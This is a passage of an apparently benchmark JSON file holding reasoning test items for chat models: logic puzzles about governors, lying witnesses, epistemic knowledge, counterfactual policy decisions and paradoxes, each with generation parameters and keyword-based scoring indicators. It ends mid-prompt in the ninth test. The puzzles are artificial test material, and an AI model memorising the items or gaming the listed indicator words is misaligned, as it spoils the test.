{
  "suite_info": {
    "name": "Combined Instruct Model Test Suite",
    "version": "1.0.0",
    "total_tests": 140,
    "extracted_from": "instruct-models/test_*.py",
    "extraction_date": "2024-01-01",
    "api_type": "chat"
  },
  "tests": [
    {
      "id": "reasoning_test_01",
      "name": "Test 1: Multi-Layer Deductive Chain",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_logic",
      "reasoning_type": "chain_of_thought",
      "api_type": "chat",
      "description": "Instruct test case for reasoning logic",
      "prompt": "\nConsider the following complex scenario with multiple interconnected rules:\n\nIn the nation of Logica, there are five provinces: Northland, Southland, Eastland, Westland, and Centraland. Each province has exactly one governor, and these governors follow strict protocols:\n\n1. If Northland's governor attends a meeting, then either Southland's or Eastland's governor must also attend, but not both.\n2. Westland's governor attends a meeting if and only if at least three other governors attend.\n3. Centraland's governor never attends the same meetings as Northland's governor.\n4. If Southland's governor attends, then Centraland's governor must also attend.\n5. Eastland's governor attends every meeting where exactly two other governors are present.\n6. There must be at least two governors at every official meeting.\n7. If Westland's governor doesn't attend, then either Northland's or Southland's governor must attend, but not both.\n\nQuestion: For next week's critical infrastructure meeting, Eastland's governor has already confirmed attendance. Based solely on these rules, determine:\na) Which governors MUST attend\nb) Which governors CANNOT attend  \nc) Which governors MIGHT attend (attendance is possible but not required)\nd) Is there more than one valid configuration? If so, enumerate all possibilities.\n\nProvide detailed logical reasoning for each conclusion, showing how you applied each rule and resolved any apparent contradictions. Explain why certain combinations are impossible and how the constraints interact to limit the possible configurations.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nConsider the following complex scenario with multiple interconnected rules:\n\nIn the nation of Logica, there are five provinces: Northland, Southland, Eastland, Westland, and Centraland. Each province has exactly one governor, and these governors follow strict protocols:\n\n1. If Northland's governor attends a meeting, then either Southland's or Eastland's governor must also attend, but not both.\n2. Westland's governor attends a meeting if and only if at least three other governors attend.\n3. Centraland's governor never attends the same meetings as Northland's governor.\n4. If Southland's governor attends, then Centraland's governor must also attend.\n5. Eastland's governor attends every meeting where exactly two other governors are present.\n6. There must be at least two governors at every official meeting.\n7. If Westland's governor doesn't attend, then either Northland's or Southland's governor must attend, but not both.\n\nQuestion: For next week's critical infrastructure meeting, Eastland's governor has already confirmed attendance. Based solely on these rules, determine:\na) Which governors MUST attend\nb) Which governors CANNOT attend  \nc) Which governors MIGHT attend (attendance is possible but not required)\nd) Is there more than one valid configuration? If so, enumerate all possibilities.\n\nProvide detailed logical reasoning for each conclusion, showing how you applied each rule and resolved any apparent contradictions. Explain why certain combinations are impossible and how the constraints interact to limit the possible configurations.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "logical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "chain_of_thought",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_02",
      "name": "Test 2: Temporal Logic Puzzle",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_logic",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning logic",
      "prompt": "\nFive witnesses gave testimonies about a series of events that occurred in a mansion during a thunderstorm. Each witness is either always truthful, always lies, or alternates between truth and lies with each statement they make. Analyze their testimonies:\n\nWitness A states:\n1. \"The power went out before the vase was broken.\"\n2. \"Witness B is a constant liar.\"\n3. \"The butler was in the kitchen when the lights went out.\"\n4. \"I saw Witness C in the library after the crash.\"\n\nWitness B states:\n1. \"Witness A alternates between truth and lies.\"\n2. \"The vase was broken while the lights were still on.\"\n3. \"Witness D was with me when we heard the crash.\"\n4. \"The butler left the kitchen before the power outage.\"\n\nWitness C states:\n1. \"I am always truthful.\"\n2. \"Witness B's second statement is false.\"\n3. \"The crash happened exactly at midnight.\"\n4. \"Witness E is an alternator.\"\n\nWitness D states:\n1. \"Witness C's first statement is a lie.\"\n2. \"I was alone when the crash occurred.\"\n3. \"The power went out at 11:58 PM.\"\n4. \"Witness A is always truthful.\"\n\nWitness E states:\n1. \"At least two witnesses here are constant liars.\"\n2. \"The crash happened after midnight.\"\n3. \"Witness D's third statement is true.\"\n4. \"The butler was in three different rooms that night.\"\n\nDetermine:\n1. The truth-telling pattern of each witness (always true, always false, or alternating)\n2. The actual sequence of events\n3. The location of each person at critical moments\n4. Which statements are true and which are false\n\nExplain your reasoning process, including how you resolved contradictions and used the constraints of each witness type to narrow down possibilities. Show why your solution is the only consistent one.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive witnesses gave testimonies about a series of events that occurred in a mansion during a thunderstorm. Each witness is either always truthful, always lies, or alternates between truth and lies with each statement they make. Analyze their testimonies:\n\nWitness A states:\n1. \"The power went out before the vase was broken.\"\n2. \"Witness B is a constant liar.\"\n3. \"The butler was in the kitchen when the lights went out.\"\n4. \"I saw Witness C in the library after the crash.\"\n\nWitness B states:\n1. \"Witness A alternates between truth and lies.\"\n2. \"The vase was broken while the lights were still on.\"\n3. \"Witness D was with me when we heard the crash.\"\n4. \"The butler left the kitchen before the power outage.\"\n\nWitness C states:\n1. \"I am always truthful.\"\n2. \"Witness B's second statement is false.\"\n3. \"The crash happened exactly at midnight.\"\n4. \"Witness E is an alternator.\"\n\nWitness D states:\n1. \"Witness C's first statement is a lie.\"\n2. \"I was alone when the crash occurred.\"\n3. \"The power went out at 11:58 PM.\"\n4. \"Witness A is always truthful.\"\n\nWitness E states:\n1. \"At least two witnesses here are constant liars.\"\n2. \"The crash happened after midnight.\"\n3. \"Witness D's third statement is true.\"\n4. \"The butler was in three different rooms that night.\"\n\nDetermine:\n1. The truth-telling pattern of each witness (always true, always false, or alternating)\n2. The actual sequence of events\n3. The location of each person at critical moments\n4. Which statements are true and which are false\n\nExplain your reasoning process, including how you resolved contradictions and used the constraints of each witness type to narrow down possibilities. Show why your solution is the only consistent one.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "logical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_03",
      "name": "Test 3: Epistemic Modal Logic",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_logic",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning logic",
      "prompt": "\nIn a research facility, five scientists (Alice, Bob, Carol, David, and Eve) are working on different aspects of a classified project. The security protocols create interesting knowledge dynamics:\n\nInitial Setup:\n- Alice knows the project's true purpose\n- Bob knows what Alice knows, but doesn't know that he knows it\n- Carol knows that Bob knows something important, but doesn't know what\n- David knows that Carol doesn't know the full picture\n- Eve knows what everyone else knows and doesn't know\n\nNew Information Arrives:\nA memo is circulated that states: \"Anyone who knows the project's true purpose must know that they know it.\" However, the memo itself doesn't reveal the project's purpose.\n\nAfter reading the memo:\n1. Bob realizes something about his own knowledge\n2. Carol deduces something from Bob's reaction\n3. David updates his beliefs about what Carol knows\n4. Eve observes everyone's reactions\n\nAdditional Constraints:\n- If someone knows X and knows that they know X, they act differently in meetings\n- Anyone who acts differently is noticed by Eve\n- Carol is very perceptive and can deduce when someone has had a realization\n- David always assumes others know less than they actually do\n\nQuestions:\n1. After the memo, what does each scientist know about the project?\n2. What does each scientist know about what the others know?\n3. Who will act differently in the next meeting and why?\n4. Can Eve deduce the project's true purpose from observing reactions? Explain.\n5. Is there a state where everyone knows the truth but doesn't know that everyone knows? \n\nDetail the epistemic states at each stage and explain how knowledge propagates through the group. Address the distinction between knowing something and knowing that you know it.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nIn a research facility, five scientists (Alice, Bob, Carol, David, and Eve) are working on different aspects of a classified project. The security protocols create interesting knowledge dynamics:\n\nInitial Setup:\n- Alice knows the project's true purpose\n- Bob knows what Alice knows, but doesn't know that he knows it\n- Carol knows that Bob knows something important, but doesn't know what\n- David knows that Carol doesn't know the full picture\n- Eve knows what everyone else knows and doesn't know\n\nNew Information Arrives:\nA memo is circulated that states: \"Anyone who knows the project's true purpose must know that they know it.\" However, the memo itself doesn't reveal the project's purpose.\n\nAfter reading the memo:\n1. Bob realizes something about his own knowledge\n2. Carol deduces something from Bob's reaction\n3. David updates his beliefs about what Carol knows\n4. Eve observes everyone's reactions\n\nAdditional Constraints:\n- If someone knows X and knows that they know X, they act differently in meetings\n- Anyone who acts differently is noticed by Eve\n- Carol is very perceptive and can deduce when someone has had a realization\n- David always assumes others know less than they actually do\n\nQuestions:\n1. After the memo, what does each scientist know about the project?\n2. What does each scientist know about what the others know?\n3. Who will act differently in the next meeting and why?\n4. Can Eve deduce the project's true purpose from observing reactions? Explain.\n5. Is there a state where everyone knows the truth but doesn't know that everyone knows? \n\nDetail the epistemic states at each stage and explain how knowledge propagates through the group. Address the distinction between knowing something and knowing that you know it.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "logical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_04",
      "name": "Test 4: Counterfactual Reasoning Chain",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "chain_of_thought",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nAnalyze this complex scenario involving multiple counterfactual conditions:\n\nIn the country of Hypothetica, five major decisions were made last year:\n- Decision A: Implement a new tax system\n- Decision B: Build a national railway\n- Decision C: Establish universal healthcare\n- Decision D: Increase military spending\n- Decision E: Invest in renewable energy\n\nThe actual outcomes were:\n- The economy grew by 3%\n- Unemployment fell to 4%\n- Public satisfaction increased to 65%\n- The deficit increased by $50 billion\n- Carbon emissions decreased by 10%\n\nConsider these counterfactual relationships:\n1. If Decision A hadn't been made, Decision C would have been impossible\n2. If Decision B had been made differently (local instead of national), Decision E would have been unnecessary\n3. Had Decision C not occurred, either Decision D or E would have been doubled in scope\n4. If both A and B hadn't happened, the country would have had to choose exactly two from C, D, and E\n5. Decision D was only possible because Decision A was implemented first\n6. Had Decision E been twice as large, Decision B would have been impossible\n\nAdditional counterfactual claims by analysts:\n- Analyst 1: \"Without Decision A, economic growth would have been negative\"\n- Analyst 2: \"If we had skipped Decision B, we could have afforded both double C and double E\"\n- Analyst 3: \"Decision D was unnecessary; without it, all other outcomes would have been better\"\n- Analyst 4: \"Had we done none of these decisions, we'd be better off\"\n- Analyst 5: \"The only essential decisions were A and C\"\n\nEvaluate:\n1. Which analyst's counterfactual claims are logically consistent with the given relationships?\n2. What would have been the minimal set of decisions to achieve positive economic growth?\n3. Is there a combination that would have been impossible given the constraints?\n4. What can we definitively conclude about the necessity of each decision?\n5. Which counterfactual scenarios lead to logical contradictions?\n\nExplain your reasoning about causation, dependency, and the validity of counterfactual claims.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this complex scenario involving multiple counterfactual conditions:\n\nIn the country of Hypothetica, five major decisions were made last year:\n- Decision A: Implement a new tax system\n- Decision B: Build a national railway\n- Decision C: Establish universal healthcare\n- Decision D: Increase military spending\n- Decision E: Invest in renewable energy\n\nThe actual outcomes were:\n- The economy grew by 3%\n- Unemployment fell to 4%\n- Public satisfaction increased to 65%\n- The deficit increased by $50 billion\n- Carbon emissions decreased by 10%\n\nConsider these counterfactual relationships:\n1. If Decision A hadn't been made, Decision C would have been impossible\n2. If Decision B had been made differently (local instead of national), Decision E would have been unnecessary\n3. Had Decision C not occurred, either Decision D or E would have been doubled in scope\n4. If both A and B hadn't happened, the country would have had to choose exactly two from C, D, and E\n5. Decision D was only possible because Decision A was implemented first\n6. Had Decision E been twice as large, Decision B would have been impossible\n\nAdditional counterfactual claims by analysts:\n- Analyst 1: \"Without Decision A, economic growth would have been negative\"\n- Analyst 2: \"If we had skipped Decision B, we could have afforded both double C and double E\"\n- Analyst 3: \"Decision D was unnecessary; without it, all other outcomes would have been better\"\n- Analyst 4: \"Had we done none of these decisions, we'd be better off\"\n- Analyst 5: \"The only essential decisions were A and C\"\n\nEvaluate:\n1. Which analyst's counterfactual claims are logically consistent with the given relationships?\n2. What would have been the minimal set of decisions to achieve positive economic growth?\n3. Is there a combination that would have been impossible given the constraints?\n4. What can we definitively conclude about the necessity of each decision?\n5. Which counterfactual scenarios lead to logical contradictions?\n\nExplain your reasoning about causation, dependency, and the validity of counterfactual claims.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "chain_of_thought",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_05",
      "name": "Test 5: Recursive Belief Paradox",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nIn the village of Metacognition, there's a peculiar tradition regarding beliefs about beliefs:\n\nThe Rules:\n1. Every villager must have a belief about what the majority believes\n2. A villager is \"enlightened\" if their belief about the majority belief is correct\n3. The majority is defined as more than 50% of villagers\n4. Each villager knows the rules and knows that everyone else knows them\n\nThe Situation:\nThere are 100 villagers. A question is posed: \"Is the village well-governed?\"\n\nInitial beliefs:\n- 40 villagers believe \"Yes, the village is well-governed\"\n- 60 villagers believe \"No, the village is not well-governed\"\n\nHowever, regarding what they think the majority believes:\n- 70 villagers believe that the majority thinks \"Yes\"\n- 30 villagers believe that the majority thinks \"No\"\n\nThe Paradox Emerges:\nThe village elder announces: \"Those who are enlightened about the majority belief will have their actual belief count double in future decisions.\"\n\nThis creates recursive complexity:\n1. The \"enlightened\" are those 30 who correctly believe the majority thinks \"No\"\n2. But if their beliefs count double, does this change what the majority believes?\n3. If the majority belief changes, who is actually enlightened?\n4. If the enlightened set changes, how does this affect the weighting?\n\nAdditional Complications:\n- Each villager can reason about this recursion\n- They can update their beliefs about what the majority believes\n- But updating might change their enlightenment status\n- Some villagers realize this creates an infinite loop\n\nQuestions:\n1. Is there a stable configuration where the system reaches equilibrium?\n2. Can a villager guarantee their own enlightenment through strategic belief?\n3. What happens if villagers coordinate their beliefs about beliefs?\n4. Is the elder's rule logically implementable, or does it create an unresolvable paradox?\n5. How many levels of \"belief about belief about belief\" are necessary to analyze this fully?\n\nExplore the recursive nature of the problem and whether any resolution exists.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nIn the village of Metacognition, there's a peculiar tradition regarding beliefs about beliefs:\n\nThe Rules:\n1. Every villager must have a belief about what the majority believes\n2. A villager is \"enlightened\" if their belief about the majority belief is correct\n3. The majority is defined as more than 50% of villagers\n4. Each villager knows the rules and knows that everyone else knows them\n\nThe Situation:\nThere are 100 villagers. A question is posed: \"Is the village well-governed?\"\n\nInitial beliefs:\n- 40 villagers believe \"Yes, the village is well-governed\"\n- 60 villagers believe \"No, the village is not well-governed\"\n\nHowever, regarding what they think the majority believes:\n- 70 villagers believe that the majority thinks \"Yes\"\n- 30 villagers believe that the majority thinks \"No\"\n\nThe Paradox Emerges:\nThe village elder announces: \"Those who are enlightened about the majority belief will have their actual belief count double in future decisions.\"\n\nThis creates recursive complexity:\n1. The \"enlightened\" are those 30 who correctly believe the majority thinks \"No\"\n2. But if their beliefs count double, does this change what the majority believes?\n3. If the majority belief changes, who is actually enlightened?\n4. If the enlightened set changes, how does this affect the weighting?\n\nAdditional Complications:\n- Each villager can reason about this recursion\n- They can update their beliefs about what the majority believes\n- But updating might change their enlightenment status\n- Some villagers realize this creates an infinite loop\n\nQuestions:\n1. Is there a stable configuration where the system reaches equilibrium?\n2. Can a villager guarantee their own enlightenment through strategic belief?\n3. What happens if villagers coordinate their beliefs about beliefs?\n4. Is the elder's rule logically implementable, or does it create an unresolvable paradox?\n5. How many levels of \"belief about belief about belief\" are necessary to analyze this fully?\n\nExplore the recursive nature of the problem and whether any resolution exists.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_06",
      "name": "Test 6: Impossible Object Analysis",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nConsider these five objects that supposedly exist in the Museum of Logical Impossibilities. Each object has properties that seem contradictory, but the museum claims one of them actually could exist under the right interpretation:\n\nObject 1: The Truthful Mirror\n- Shows what will happen tomorrow\n- Can be used to prevent what it shows\n- Always shows the truth\n- Has been used successfully multiple times\n\nObject 2: The Complete Map\n- Contains a perfect representation of everything, including itself\n- The representation of itself contains a representation of the representation\n- Is finite in size\n- Can be consulted for accurate information\n\nObject 3: The Democratic Dictator's Crown\n- Grants absolute power to the wearer\n- Can only be worn by someone chosen by unanimous vote\n- The vote must be free and uncoerced\n- The power cannot be used to influence future votes\n- The wearer must obey the will of the people\n\nObject 4: The Forgetting Stone\n- Makes you forget something specific when touched\n- You choose what to forget while touching it\n- Once forgotten, you can't remember what you chose to forget\n- You always remember using the stone\n- You can use it multiple times successfully\n\nObject 5: The Probability Compass\n- Points to what you most need to find\n- What you \"need\" is determined by future consequences\n- Following it changes those future consequences\n- It's always accurate about the original future\n- It updates continuously as you move\n\nAnalyze each object:\n1. What logical contradictions does each object contain?\n2. Are there any interpretations under which an object could exist?\n3. Which paradoxes do these objects embody?\n4. Could any of these objects exist in a consistent logical framework?\n5. What would be the implications if such an object did exist?\n\nExplain your reasoning about possibility, self-reference, and logical consistency. Identify which object (if any) could actually exist and why.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nConsider these five objects that supposedly exist in the Museum of Logical Impossibilities. Each object has properties that seem contradictory, but the museum claims one of them actually could exist under the right interpretation:\n\nObject 1: The Truthful Mirror\n- Shows what will happen tomorrow\n- Can be used to prevent what it shows\n- Always shows the truth\n- Has been used successfully multiple times\n\nObject 2: The Complete Map\n- Contains a perfect representation of everything, including itself\n- The representation of itself contains a representation of the representation\n- Is finite in size\n- Can be consulted for accurate information\n\nObject 3: The Democratic Dictator's Crown\n- Grants absolute power to the wearer\n- Can only be worn by someone chosen by unanimous vote\n- The vote must be free and uncoerced\n- The power cannot be used to influence future votes\n- The wearer must obey the will of the people\n\nObject 4: The Forgetting Stone\n- Makes you forget something specific when touched\n- You choose what to forget while touching it\n- Once forgotten, you can't remember what you chose to forget\n- You always remember using the stone\n- You can use it multiple times successfully\n\nObject 5: The Probability Compass\n- Points to what you most need to find\n- What you \"need\" is determined by future consequences\n- Following it changes those future consequences\n- It's always accurate about the original future\n- It updates continuously as you move\n\nAnalyze each object:\n1. What logical contradictions does each object contain?\n2. Are there any interpretations under which an object could exist?\n3. Which paradoxes do these objects embody?\n4. Could any of these objects exist in a consistent logical framework?\n5. What would be the implications if such an object did exist?\n\nExplain your reasoning about possibility, self-reference, and logical consistency. Identify which object (if any) could actually exist and why.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_07",
      "name": "Test 7: Transitive Property Maze",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nIn a logic competition, participants must navigate relationships that follow modified transitive properties:\n\nRelationship Types:\n- \"Defeats\": If A defeats B and B defeats C, then A defeats C (standard transitivity)\n- \"Trusts\": If A trusts B and B trusts C, then A might trust C (probabilistic transitivity - 70% chance)\n- \"Knows\": If A knows B and B knows C, then A knows about C but doesn't necessarily know C\n- \"Owes\": If A owes B and B owes C, then C can claim from A only if all three agree\n- \"Teaches\": If A teaches B and B teaches C, then A cannot teach C (anti-transitivity)\n\nThe Network:\n- Alice defeats Bob, Bob defeats Carol, Carol defeats David, David defeats Eve, Eve defeats Alice\n- Bob trusts Carol, Carol trusts David, David trusts Eve, Eve trusts Alice, Alice trusts Bob\n- Carol knows David, David knows Eve, Eve knows Alice, Alice knows Bob, Bob knows Carol\n- David owes Eve, Eve owes Alice, Alice owes Bob, Bob owes Carol, Carol owes David\n- Eve teaches Alice, Alice teaches Bob, Bob teaches Carol, Carol teaches David, David teaches Eve\n\nComplications:\n1. If someone defeats and trusts the same person, one relationship negates\n2. Knowing about someone through transitivity creates a \"weak knowledge\" relationship\n3. Circular debt can be resolved only if there's a trust path connecting all parties\n4. Teaching relationships can be inherited: if you can't teach someone, neither can your students\n5. If a defeat cycle exists, all victories within it are nullified\n\nQuestions:\n1. After applying all rules and complications, who actually defeats whom?\n2. What is the probability that Alice trusts David? Eve?\n3. Can the circular debt be resolved? If so, what agreements are needed?\n4. Who can teach whom after considering anti-transitivity and inheritance?\n5. How many \"weak knowledge\" relationships exist?\n6. Are there any logical inconsistencies in the network? If so, how would you resolve them?\n\nShow your step-by-step analysis of how the relationships evolve and interact.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nIn a logic competition, participants must navigate relationships that follow modified transitive properties:\n\nRelationship Types:\n- \"Defeats\": If A defeats B and B defeats C, then A defeats C (standard transitivity)\n- \"Trusts\": If A trusts B and B trusts C, then A might trust C (probabilistic transitivity - 70% chance)\n- \"Knows\": If A knows B and B knows C, then A knows about C but doesn't necessarily know C\n- \"Owes\": If A owes B and B owes C, then C can claim from A only if all three agree\n- \"Teaches\": If A teaches B and B teaches C, then A cannot teach C (anti-transitivity)\n\nThe Network:\n- Alice defeats Bob, Bob defeats Carol, Carol defeats David, David defeats Eve, Eve defeats Alice\n- Bob trusts Carol, Carol trusts David, David trusts Eve, Eve trusts Alice, Alice trusts Bob\n- Carol knows David, David knows Eve, Eve knows Alice, Alice knows Bob, Bob knows Carol\n- David owes Eve, Eve owes Alice, Alice owes Bob, Bob owes Carol, Carol owes David\n- Eve teaches Alice, Alice teaches Bob, Bob teaches Carol, Carol teaches David, David teaches Eve\n\nComplications:\n1. If someone defeats and trusts the same person, one relationship negates\n2. Knowing about someone through transitivity creates a \"weak knowledge\" relationship\n3. Circular debt can be resolved only if there's a trust path connecting all parties\n4. Teaching relationships can be inherited: if you can't teach someone, neither can your students\n5. If a defeat cycle exists, all victories within it are nullified\n\nQuestions:\n1. After applying all rules and complications, who actually defeats whom?\n2. What is the probability that Alice trusts David? Eve?\n3. Can the circular debt be resolved? If so, what agreements are needed?\n4. Who can teach whom after considering anti-transitivity and inheritance?\n5. How many \"weak knowledge\" relationships exist?\n6. Are there any logical inconsistencies in the network? If so, how would you resolve them?\n\nShow your step-by-step analysis of how the relationships evolve and interact.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_08",
      "name": "Test 8: GÃ¶del's Island Variant",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nOn an island, there are 100 inhabitants who follow strange logical rules. Each inhabitant is either a Knight (always tells truth), a Knave (always lies), or a Joker (makes statements that are neither true nor false - they are paradoxical or undefined).\n\nThe island has a peculiar property: Any statement about the island's properties that creates a logical paradox becomes true by making the speaker a Joker.\n\nYou meet five inhabitants who make the following statements:\n\nPerson A: \"At least 60 inhabitants are Knaves, and I am not one of them.\"\n\nPerson B: \"Person A is a Joker if and only if this statement is false.\"\n\nPerson C: \"The number of Knights equals the number of Knaves, and there are exactly 20 Jokers.\"\n\nPerson D: \"If I am a Knight, then Person B is a Knave. If I am a Knave, then Person B is a Knight. If I am a Joker, then Person B is also a Joker.\"\n\nPerson E: \"This statement is true if and only if I am not a Joker.\"\n\nAdditionally, the Island Oracle (who exists outside the Knight/Knave/Joker system) tells you: \"The total number of true statements made by these five people equals the number of Jokers among them.\"\n\nDetermine:\n1. What type is each person (Knight, Knave, or Joker)?\n2. Which statements are true, false, or paradoxical?\n3. How does the island's peculiar property affect the logical analysis?\n4. Is the Oracle's statement consistent with your conclusions?\n5. What can we deduce about the actual distribution of types on the island?\n6. Are there multiple valid solutions, or is the answer unique?\n\nExplain how self-reference and paradox resolution work in this system.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nOn an island, there are 100 inhabitants who follow strange logical rules. Each inhabitant is either a Knight (always tells truth), a Knave (always lies), or a Joker (makes statements that are neither true nor false - they are paradoxical or undefined).\n\nThe island has a peculiar property: Any statement about the island's properties that creates a logical paradox becomes true by making the speaker a Joker.\n\nYou meet five inhabitants who make the following statements:\n\nPerson A: \"At least 60 inhabitants are Knaves, and I am not one of them.\"\n\nPerson B: \"Person A is a Joker if and only if this statement is false.\"\n\nPerson C: \"The number of Knights equals the number of Knaves, and there are exactly 20 Jokers.\"\n\nPerson D: \"If I am a Knight, then Person B is a Knave. If I am a Knave, then Person B is a Knight. If I am a Joker, then Person B is also a Joker.\"\n\nPerson E: \"This statement is true if and only if I am not a Joker.\"\n\nAdditionally, the Island Oracle (who exists outside the Knight/Knave/Joker system) tells you: \"The total number of true statements made by these five people equals the number of Jokers among them.\"\n\nDetermine:\n1. What type is each person (Knight, Knave, or Joker)?\n2. Which statements are true, false, or paradoxical?\n3. How does the island's peculiar property affect the logical analysis?\n4. Is the Oracle's statement consistent with your conclusions?\n5. What can we deduce about the actual distribution of types on the island?\n6. Are there multiple valid solutions, or is the answer unique?\n\nExplain how self-reference and paradox resolution work in this system.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_09",
      "name": "Test 9: The Metacognitive Tournament",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive philosophers enter a tournament where scoring depends on predicting both outcomes and other players' predictions:\n\nRound Structure:\n- Each philosopher predicts who will win the round\n- They also predict what each other philosopher will predict\n- Points are awarded for correct predictions at both levels\n- The winner is determined by who has the most correct predictions\n\nThe Philosophers' Strategies:\n- Aristotle: Always predicts the most logical outcome based on past performance\n- Berkeley: Predicts based on what he believes others perceive to be likely\n- Confucius: Seeks harmony by predicting the outcome that creates the least conflict\n- Descartes: Doubts everything and predicts the least expected outcome\n- Epicurus: Predicts whatever leads to the most interesting paradox\n\nHistorical Performance:\n- In previous tournaments, Aristotle won 40% of rounds\n- Berkeley won 25% of rounds\n- Confucius won 20% of rounds\n- Descartes won 10% of rounds\n- Epicurus won 5% of rounds\n\nThe Metacognitive Twist:\nEach philosopher knows:\n1. Everyone's historical performance\n2. Everyone's strategy\n3. That everyone knows everyone's strategy\n4. That this knowledge affects predictions\n\nFor the final round:\n- Aristotle predicts Aristotle will win (based on history)\n- Berkeley predicts Confucius 